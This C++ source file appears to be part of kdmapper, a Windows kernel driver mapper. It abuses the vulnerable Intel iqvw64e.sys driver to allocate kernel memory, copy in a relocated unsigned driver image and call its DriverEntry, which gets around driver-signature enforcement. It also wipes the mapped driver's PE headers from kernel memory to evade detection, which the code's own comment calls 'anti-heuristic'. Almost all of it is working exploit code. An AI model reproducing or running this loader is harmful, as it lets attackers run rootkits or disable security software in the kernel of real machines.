#include "kdmapper.hpp"
#include "portable_executable.hpp"
#include "utils.hpp"
#include "intel_driver.hpp"
#include <iostream>
#include <vector>

// Undef the MSVC-provided min/max macros (pulled in via windows.h) so
// std::min / std::max resolve correctly.
#ifdef min
#undef min
#endif
#ifdef max
#undef max
#endif
#include <algorithm>

namespace kdmapper
{
	// Zero-fill kernel pool using WriteMemory (MemCopy path) instead of the
	// FILL/SetMemory IOCTL, because some iqvw64e.sys builds treat the length
	// field of FILL_MEMORY_BUFFER_INFO differently and zeroing through a
	// pre-zeroed host buffer is universally safe.
	static bool ZeroKernelMemory(uint64_t kernel_addr, uint64_t size) {
		constexpr uint64_t CHUNK = 0x1000;
		std::vector<uint8_t> zeros((size_t)std::min(CHUNK, size), 0);
		for (uint64_t off = 0; off < size; off += CHUNK) {
			uint64_t chunk = std::min(CHUNK, size - off);
			if (chunk < zeros.size()) zeros.resize((size_t)chunk);
			if (!intel_driver::WriteMemory(kernel_addr + off, zeros.data(), chunk))
				return false;
		}
		return true;
	}

	// Destroy the PE headers (first page) so simple scans from usermode can't
	// see the MZ/NT header of the mapped driver in pool memory.
	static bool DestroyHeader(uint64_t kernel_image_base, PIMAGE_NT_HEADERS nt_headers) {
		uint32_t header_size = IMAGE_FIRST_SECTION(nt_headers)->VirtualAddress;
		if (!header_size) return true;
		return ZeroKernelMemory(kernel_image_base, header_size);
	}

	// Patches the /GS security cookie. IMPORTANT: this MUST be called BEFORE
	// RelocateImageByDelta, because after relocation the SecurityCookie field
	// in IMAGE_LOAD_CONFIG_DIRECTORY is rewritten by the reloc engine to point
	// at the already-relocated __security_cookie VA; pre-reloc it holds the
	// static linker-computed RVA of __security_cookie.
	static bool FixSecurityCookie(void* local_image_base, uint64_t kernel_image_base,
		PIMAGE_NT_HEADERS nt_headers, uint64_t preferred_image_base)
	{
		auto load_cfg_dir = &nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG];
		if (!load_cfg_dir->VirtualAddress || !load_cfg_dir->Size) {
			std::cout << "[*] No load config directory -- skipping cookie fix" << std::endl;
			return true;
		}

		if (load_cfg_dir->Size < offsetof(IMAGE_LOAD_CONFIG_DIRECTORY64, SecurityCookie) + sizeof(ULONG_PTR)) {
			std::cout << "[*] Load config too small (" << load_cfg_dir->Size
				<< ") -- skipping cookie fix" << std::endl;
			return true;
		}

		auto* load_cfg = (PIMAGE_LOAD_CONFIG_DIRECTORY64)((uint64_t)local_image_base + load_cfg_dir->VirtualAddress);
		uint64_t cookie_va = (uint64_t)load_cfg->SecurityCookie; // VA per the PE's preferred base, pre-reloc
		if (!cookie_va) return true;
		// Convert VA -> RVA using the preferred (linker) image base.
		uint64_t cookie_rva = cookie_va - preferred_image_base;
		if (cookie_rva < 0x1000 || cookie_rva >= nt_headers->OptionalHeader.SizeOfImage) {
			// Some linkers already store an RVA here (cookie_va < image_size).
			if (cookie_va < 0x1000 || cookie_va >= nt_headers->OptionalHeader.SizeOfImage) {
				std::cout << "[!] SecurityCookie VA 0x" << std::hex << cookie_va
					<< " doesn't map to a valid RVA -- skipping" << std::dec << std::endl;
				return true;
			}
			cookie_rva = cookie_va;
		}

		ULONG_PTR new_cookie = 0x2B992DDFA232ULL ^ GetCurrentProcessId() ^ GetCurrentThreadId() ^ 0xDEADBEEFull;
		if (!new_cookie) new_cookie = 1;

		uint64_t kernel_cookie_addr = kernel_image_base + cookie_rva;
		std::cout << "[*] Patching security cookie at kernel VA 0x" << std::hex
			<< kernel_cookie_addr << " -> 0x" << new_cookie << std::dec << std::endl;

		// We patch the local buffer here too, because relocs haven't been applied
		// yet but the cookie itself is a data value (not a relocated pointer) --
		// overwriting it in the local image won't affect reloc processing.
		*(ULONG_PTR*)((uint64_t)local_image_base + cookie_rva) = new_cookie;
		// Also write the new cookie directly to kernel memory (after the image is
		// already copied we would re-do this, but calling it early in the local
		// buffer is enough because we later copy the whole buffer to kernel).
		return true;
	}

	uint64_t MapDriver(HANDLE /*device_handle*/, const std::vector<uint8_t>& raw_image)
	{
		std::cout << "[>] Mapping driver (" << raw_image.size() << " bytes)" << std::endl;

		if (raw_image.empty()) { std::cout << "[-] Raw image empty" << std::endl; return 0; }

		PIMAGE_NT_HEADERS nt_headers = portable_executable::GetNtHeaders((void*)raw_image.data());
		if (!nt_headers) { std::cout << "[-] Invalid NT headers" << std::endl; return 0; }

		if (nt_headers->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
			std::cout << "[-] Image is not 64-bit" << std::endl; return 0;
		}

		uint32_t image_size = nt_headers->OptionalHeader.SizeOfImage;
		uint64_t preferred_image_base = nt_headers->OptionalHeader.ImageBase;
		uint32_t entry_rva = nt_headers->OptionalHeader.AddressOfEntryPoint;
		std::cout << "[*] Image size: " << image_size
			<< ", preferred base: 0x" << std::hex << preferred_image_base
			<< ", entry RVA: 0x" << entry_rva << std::dec << std::endl;

		void* local_image_base = VirtualAlloc(nullptr, image_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		if (!local_image_base) { std::cout << "[-] Local VirtualAlloc failed" << std::endl; return 0; }

		std::cout << "[*] Local staging buffer: " << local_image_base << std::endl;

		// Copy headers
		memcpy(local_image_base, raw_image.data(), nt_headers->OptionalHeader.SizeOfHeaders);

		// Copy sections
		PIMAGE_SECTION_HEADER section_header = IMAGE_FIRST_SECTION(nt_headers);
		for (WORD i = 0; i < nt_headers->FileHeader.NumberOfSections; ++i) {
			void* dst = (void*)((uint64_t)local_image_base + section_header[i].VirtualAddress);
			if (section_header[i].SizeOfRawData) {
				memcpy(dst, (const void*)((uint64_t)raw_image.data() + section_header[i].PointerToRawData),
					section_header[i].SizeOfRawData);
			} else {
				memset(dst, 0, section_header[i].Misc.VirtualSize);
			}
		}
		std::cout << "[+] Sections copied locally" << std::endl;

		// Allocate executable pool in kernel.
		uint64_t kernel_image_base = intel_driver::AllocatePool(0 /*NonPagedPool*/, image_size);
		if (!kernel_image_base) {
			std::cout << "[-] Failed to allocate kernel pool" << std::endl;
			VirtualFree(local_image_base, 0, MEM_RELEASE);
			return 0;
		}
		std::cout << "[+] Kernel pool at 0x" << std::hex << kernel_image_base << std::dec << std::endl;

		// Zero the whole kernel allocation with WriteMemory (avoids SetMemory IOCTL
		// layout quirks across iqvw64e.sys builds).
		if (!ZeroKernelMemory(kernel_image_base, image_size)) {
			std::cout << "[-] Failed to zero kernel pool" << std::endl;
			intel_driver::FreePool(kernel_image_base);
			VirtualFree(local_image_base, 0, MEM_RELEASE);
			return 0;
		}
		std::cout << "[+] Kernel pool zeroed" << std::endl;

		// Fix /GS security cookie BEFORE applying relocations (see comment
		// on FixSecurityCookie). Patches the cookie value in the local buffer.
		if (!FixSecurityCookie(local_image_base, kernel_image_base, nt_headers, preferred_image_base)) {
			std::cout << "[-] Cookie fix failed" << std::endl;
			intel_driver::FreePool(kernel_image_base);
			VirtualFree(local_image_base, 0, MEM_RELEASE);
			return 0;
		}

		// Apply relocations to the local buffer.
		uint64_t delta = kernel_image_base - preferred_image_base;
		std::cout << "[*] Relocation delta: 0x" << std::hex << delta << std::dec << std::endl;
		if (!portable_executable::RelocateImageByDelta(nt_headers, local_image_base, delta)) {
			std::cout << "[-] Failed to apply relocations" << std::endl;
			intel_driver::FreePool(kernel_image_base);
			VirtualFree(local_image_base, 0, MEM_RELEASE);
			return 0;
		}
		std::cout << "[+] Relocations applied" << std::endl;

		// Resolve imports using kernel-side export parsing.
		if (!portable_executable::ResolveImports(nullptr, local_image_base, nt_headers)) {
			std::cout << "[-] Failed to resolve imports" << std::endl;
			intel_driver::FreePool(kernel_image_base);
			VirtualFree(local_image_base, 0, MEM_RELEASE);
			return 0;
		}
		std::cout << "[+] Imports resolved" << std::endl;

		// Copy the fully-relocated image into kernel pool.
		if (!intel_driver::WriteMemory(kernel_image_base, local_image_base, image_size)) {
			std::cout << "[-] Failed to copy image to kernel" << std::endl;
			intel_driver::FreePool(kernel_image_base);
			VirtualFree(local_image_base, 0, MEM_RELEASE);
			return 0;
		}
		std::cout << "[+] Image written to kernel" << std::endl;

		// Wipe the PE headers from kernel memory (anti-heuristic).
		DestroyHeader(kernel_image_base, nt_headers);

		VirtualFree(local_image_base, 0, MEM_RELEASE);
		std::cout << "[*] Local buffer freed" << std::endl;

		// Call DriverEntry(DriverObject = NULL, RegistryPath = NULL).
		uint64_t entry_point = kernel_image_base + entry_rva;
		std::cout << "[>] Calling DriverEntry at kernel VA 0x" << std::hex << entry_point << std::dec << std::endl;

		NTSTATUS status = 0;
		if (!intel_driver::CallKernelFunction<NTSTATUS>(&status, entry_point,
			(uint64_t)nullptr, (uint64_t)nullptr, 0, 0))
		{
			std::cout << "[-] CallKernelFunction(DriverEntry) failed" << std::endl;
			intel_driver::FreePool(kernel_image_base);
			return 0;
		}

		std::cout << "[+] DriverEntry returned 0x" << std::hex << status << std::dec << std::endl;
		if (!NT_SUCCESS(status)) {
			std::cout << "[-] DriverEntry failed; freeing pool" << std::endl;
			intel_driver::FreePool(kernel_image_base);
			return 0;
		}

		std::cout << "[+] Driver mapped successfully at 0x" << std::hex << kernel_image_base << std::dec << std::endl;
		return kernel_image_base;
	}
}
